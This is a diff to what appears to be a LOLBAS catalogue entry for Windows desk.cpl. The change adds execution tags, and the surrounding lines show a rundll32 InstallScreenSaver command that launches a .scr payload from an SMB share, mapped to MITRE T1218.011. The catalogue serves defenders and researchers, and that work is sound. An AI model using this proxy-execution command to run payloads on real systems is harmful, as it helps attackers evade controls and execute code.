@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
   - Command: rundll32.exe desk.cpl,InstallScreenSaver \\127.0.0.1\c$\temp\file.scr
     Description: Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.
     Usecase: Launch any executable payload, as long as it uses the .scr extension.
@@ -18,6 +20,9 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Execute: EXE
+      - Execute: Remote
 Full_Path:
   - Path: C:\Windows\System32\desk.cpl
   - Path: C:\Windows\SysWOW64\desk.cpl
